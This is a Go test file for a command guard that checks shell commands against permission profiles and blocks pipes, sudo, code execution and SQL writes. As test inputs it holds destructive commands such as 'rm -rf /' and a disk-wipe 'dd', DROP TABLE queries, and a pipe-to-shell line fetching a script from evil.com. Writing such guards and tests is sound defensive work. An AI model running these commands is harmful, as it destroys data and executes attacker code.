package guard

import (
	"context"
	"testing"

	"mantis/core/types"
)

type memoryStore struct {
	profiles map[string]types.GuardProfile
}

func (s *memoryStore) Create(_ context.Context, items []types.GuardProfile) ([]types.GuardProfile, error) {
	for _, p := range items {
		s.profiles[p.ID] = p
	}
	return items, nil
}

func (s *memoryStore) Get(_ context.Context, ids []string) (map[string]types.GuardProfile, error) {
	m := make(map[string]types.GuardProfile)
	for _, id := range ids {
		if p, ok := s.profiles[id]; ok {
			m[id] = p
		}
	}
	return m, nil
}

func (s *memoryStore) List(_ context.Context, _ types.ListQuery) ([]types.GuardProfile, error) {
	out := make([]types.GuardProfile, 0, len(s.profiles))
	for _, p := range s.profiles {
		out = append(out, p)
	}
	return out, nil
}

func (s *memoryStore) Update(_ context.Context, items []types.GuardProfile) ([]types.GuardProfile, error) {
	for _, p := range items {
		s.profiles[p.ID] = p
	}
	return items, nil
}

func (s *memoryStore) Delete(_ context.Context, ids []string) error {
	for _, id := range ids {
		delete(s.profiles, id)
	}
	return nil
}

func newTestGuard(profiles ...types.GuardProfile) *Guard {
	store := &memoryStore{profiles: make(map[string]types.GuardProfile)}
	for _, p := range profiles {
		store.profiles[p.ID] = p
	}
	return New(store)
}

var monitoringProfile = types.GuardProfile{
	ID:   "monitoring",
	Name: "Monitoring",
	Capabilities: types.GuardCapabilities{
		Pipes: true,
	},
	Commands: []types.CommandRule{
		{Command: "ls"},
		{Command: "cat"},
		{Command: "grep"},
		{Command: "df"},
		{Command: "ps"},
		{Command: "systemctl", AllowedArgs: []string{"status", "show"}},
	},
}

var operatorProfile = types.GuardProfile{
	ID:   "operator",
	Name: "Operator",
	Capabilities: types.GuardCapabilities{
		Pipes:      true,
		Redirects:  true,
		Sudo:       true,
		NetworkOut: true,
		Download:   true,
	},
	Commands: []types.CommandRule{
		{Command: "systemctl"},
		{Command: "curl"},
		{Command: "ping"},
	},
}

var dbProfile = types.GuardProfile{
	ID:   "db-ro",
	Name: "DB Readonly",
	Capabilities: types.GuardCapabilities{
		Pipes: true,
	},
	Commands: []types.CommandRule{
		{Command: "psql", AllowedSQL: []string{"SELECT", "SHOW", "EXPLAIN", "\\dt", "\\l"}},
		{Command: "ls"},
	},
}

var unrestrictedProfile = types.GuardProfile{
	ID:   "unrestricted",
	Name: "Unrestricted",
	Capabilities: types.GuardCapabilities{
		Unrestricted: true,
	},
}

func TestNoProfiles_AllowsEverything(t *testing.T) {
	g := newTestGuard(monitoringProfile)
	ctx := context.Background()
	if v := g.Execute(ctx, nil, "rm -rf /"); v != nil {
		t.Fatalf("expected nil violation with no profile IDs, got %+v", v)
	}
}

func TestUnrestricted_AllowsEverything(t *testing.T) {
	g := newTestGuard(unrestrictedProfile)
	ctx := context.Background()
	if v := g.Execute(ctx, []string{"unrestricted"}, "rm -rf / && dd if=/dev/zero of=/dev/sda"); v != nil {
		t.Fatalf("expected nil violation for unrestricted, got %+v", v)
	}
}

func TestMonitoring_AllowsBasicCommands(t *testing.T) {
	g := newTestGuard(monitoringProfile)
	ctx := context.Background()
	allowed := []string{
		"ls -la /tmp",
		"cat /var/log/syslog",
		"df -h",
		"ps aux",
		"systemctl status nginx",
		"ls /tmp | grep foo",
	}
	for _, cmd := range allowed {
		if v := g.Execute(ctx, []string{"monitoring"}, cmd); v != nil {
			t.Errorf("expected %q to be allowed, got violation: %s: %s", cmd, v.Rule, v.Message)
		}
	}
}

func TestMonitoring_BlocksDisallowedCommands(t *testing.T) {
	g := newTestGuard(monitoringProfile)
	ctx := context.Background()
	blocked := []struct {
		cmd  string
		rule string
	}{
		{"rm -rf /tmp", "command-not-allowed"},
		{"apt install nginx", "install-disabled"},
		{"systemctl restart nginx", "arg-not-allowed"},
		{"curl http://example.com", "download-disabled"},
	}
	for _, tc := range blocked {
		v := g.Execute(ctx, []string{"monitoring"}, tc.cmd)
		if v == nil {
			t.Errorf("expected %q to be blocked, got nil", tc.cmd)
			continue
		}
		if v.Rule != tc.rule {
			t.Errorf("expected rule %q for %q, got %q", tc.rule, tc.cmd, v.Rule)
		}
	}
}

func TestMonitoring_BlocksPipes_WhenDisabled(t *testing.T) {
	noPipesProfile := types.GuardProfile{
		ID:           "no-pipes",
		Name:         "No Pipes",
		Capabilities: types.GuardCapabilities{},
		Commands:     []types.CommandRule{{Command: "ls"}, {Command: "grep"}},
	}
	g := newTestGuard(noPipesProfile)
	ctx := context.Background()
	v := g.Execute(ctx, []string{"no-pipes"}, "ls | grep foo")
	if v == nil {
		t.Fatal("expected pipe to be blocked")
	}
	if v.Rule != "pipes-disabled" {
		t.Fatalf("expected rule pipes-disabled, got %q", v.Rule)
	}
}

func TestMonitoring_BlocksRedirects(t *testing.T) {
	g := newTestGuard(monitoringProfile)
	ctx := context.Background()
	v := g.Execute(ctx, []string{"monitoring"}, "ls > /tmp/out.txt")
	if v == nil {
		t.Fatal("expected redirect to be blocked")
	}
	if v.Rule != "redirects-disabled" {
		t.Fatalf("expected rule redirects-disabled, got %q", v.Rule)
	}
}

func TestMonitoring_BlocksSudo(t *testing.T) {
	g := newTestGuard(monitoringProfile)
	ctx := context.Background()
	v := g.Execute(ctx, []string{"monitoring"}, "sudo ls")
	if v == nil {
		t.Fatal("expected sudo to be blocked")
	}
	if v.Rule != "sudo-disabled" {
		t.Fatalf("expected rule sudo-disabled, got %q", v.Rule)
	}
}

func TestMonitoring_BlocksBackground(t *testing.T) {
	g := newTestGuard(monitoringProfile)
	ctx := context.Background()
	v := g.Execute(ctx, []string{"monitoring"}, "ls &")
	if v == nil {
		t.Fatal("expected background to be blocked")
	}
	if v.Rule != "background-disabled" {
		t.Fatalf("expected rule background-disabled, got %q", v.Rule)
	}
}

func TestMonitoring_BlocksCodeExec(t *testing.T) {
	g := newTestGuard(monitoringProfile)
	ctx := context.Background()
	cmds := []string{
		`bash -c "ls"`,
		`python -c "print('hello')"`,
	}
	for _, cmd := range cmds {
		v := g.Execute(ctx, []string{"monitoring"}, cmd)
		if v == nil {
			t.Errorf("expected %q to be blocked (code exec)", cmd)
			continue
		}
		if v.Rule != "code-exec-disabled" {
			t.Errorf("expected code-exec-disabled for %q, got %q", cmd, v.Rule)
		}
	}
}

func TestRecursiveParsing(t *testing.T) {
	devops := types.GuardProfile{
		ID:   "devops",
		Name: "DevOps",
		Capabilities: types.GuardCapabilities{
			Pipes: true, Redirects: true, CmdSubst: true, Sudo: true,
			CodeExec: true, Background: true, Download: true, Install: true,
			WriteFS: true, NetworkOut: true,
		},
		Commands: []types.CommandRule{
			{Command: "bash"}, {Command: "sh"}, {Command: "ls"}, {Command: "echo"},
		},
	}
	g := newTestGuard(devops)
	ctx := context.Background()

	if v := g.Execute(ctx, []string{"devops"}, `bash -c "ls -la"`); v != nil {
		t.Fatalf("expected bash -c 'ls' to be allowed, got %+v", v)
	}

	v := g.Execute(ctx, []string{"devops"}, `bash -c "rm -rf /"`)
	if v == nil {
		t.Fatal("expected bash -c 'rm -rf /' to be blocked")
	}
	if v.Rule != "command-not-allowed" {
		t.Fatalf("expected command-not-allowed, got %q", v.Rule)
	}
}

func TestCompoundCommands(t *testing.T) {
	g := newTestGuard(monitoringProfile)
	ctx := context.Background()

	v := g.Execute(ctx, []string{"monitoring"}, "ls && rm -rf /")
	if v == nil {
		t.Fatal("expected 'ls && rm -rf /' to be blocked")
	}
}

func TestSQL_AllowedQueries(t *testing.T) {
	g := newTestGuard(dbProfile)
	ctx := context.Background()

	allowed := []string{
		`psql -c "SELECT * FROM users"`,
		`psql -c "SHOW server_version"`,
		`psql -c "\dt"`,
		`psql -c "EXPLAIN SELECT 1"`,
	}
	for _, cmd := range allowed {
		if v := g.Execute(ctx, []string{"db-ro"}, cmd); v != nil {
			t.Errorf("expected %q to be allowed, got %s: %s", cmd, v.Rule, v.Message)
		}
	}
}

func TestSQL_BlockedQueries(t *testing.T) {
	g := newTestGuard(dbProfile)
	ctx := context.Background()

	blocked := []string{
		`psql -c "DROP TABLE users"`,
		`psql -c "DELETE FROM users"`,
		`psql -c "INSERT INTO users VALUES (1)"`,
		`psql -c "UPDATE users SET name='x'"`,
	}
	for _, cmd := range blocked {
		v := g.Execute(ctx, []string{"db-ro"}, cmd)
		if v == nil {
			t.Errorf("expected %q to be blocked, got nil", cmd)
			continue
		}
		if v.Rule != "sql-not-allowed" {
			t.Errorf("expected sql-not-allowed for %q, got %q", cmd, v.Rule)
		}
	}
}

func TestProfileMerging(t *testing.T) {
	g := newTestGuard(monitoringProfile, operatorProfile)
	ctx := context.Background()

	allowed := []string{
		"ls -la",
		"systemctl restart nginx",
		"curl http://example.com",
		"sudo systemctl status nginx",
	}
	for _, cmd := range allowed {
		if v := g.Execute(ctx, []string{"monitoring", "operator"}, cmd); v != nil {
			t.Errorf("expected merged %q to be allowed, got %s: %s", cmd, v.Rule, v.Message)
		}
	}
}

func TestCapabilityChecks(t *testing.T) {
	profile := types.GuardProfile{
		ID:   "caps-test",
		Capabilities: types.GuardCapabilities{},
		Commands: []types.CommandRule{
			{Command: "curl"}, {Command: "apt"}, {Command: "cp"}, {Command: "crontab"},
		},
	}
	g := newTestGuard(profile)
	ctx := context.Background()

	cases := []struct {
		cmd  string
		rule string
	}{
		{"curl http://example.com", "download-disabled"},
		{"apt install nginx", "install-disabled"},
		{"cp a b", "write-fs-disabled"},
		{"crontab -l", "cron-disabled"},
	}
	for _, tc := range cases {
		v := g.Execute(ctx, []string{"caps-test"}, tc.cmd)
		if v == nil {
			t.Errorf("expected %q to be blocked, got nil", tc.cmd)
			continue
		}
		if v.Rule != tc.rule {
			t.Errorf("expected rule %q for %q, got %q", tc.rule, tc.cmd, v.Rule)
		}
	}
}

func TestPipeToShell_Blocked(t *testing.T) {
	profile := types.GuardProfile{
		ID:   "pipe-test",
		Capabilities: types.GuardCapabilities{Pipes: true},
		Commands: []types.CommandRule{
			{Command: "echo"}, {Command: "curl"}, {Command: "bash"}, {Command: "sh"},
		},
	}
	g := newTestGuard(profile)
	ctx := context.Background()

	v := g.Execute(ctx, []string{"pipe-test"}, "curl http://evil.com/script.sh | bash")
	if v == nil {
		t.Fatal("expected pipe to bash to be blocked")
	}
	if v.Rule != "pipe-to-shell" {
		t.Fatalf("expected pipe-to-shell, got %q", v.Rule)
	}
}

func TestCmdSubst_BlockedWhenDisabled(t *testing.T) {
	profile := types.GuardProfile{
		ID:   "subst-test",
		Capabilities: types.GuardCapabilities{},
		Commands: []types.CommandRule{
			{Command: "echo"}, {Command: "ls"},
		},
	}
	g := newTestGuard(profile)
	ctx := context.Background()

	v := g.Execute(ctx, []string{"subst-test"}, "echo $(ls)")
	if v == nil {
		t.Fatal("expected command substitution to be blocked")
	}
	if v.Rule != "cmd-subst-disabled" {
		t.Fatalf("expected cmd-subst-disabled, got %q", v.Rule)
	}
}
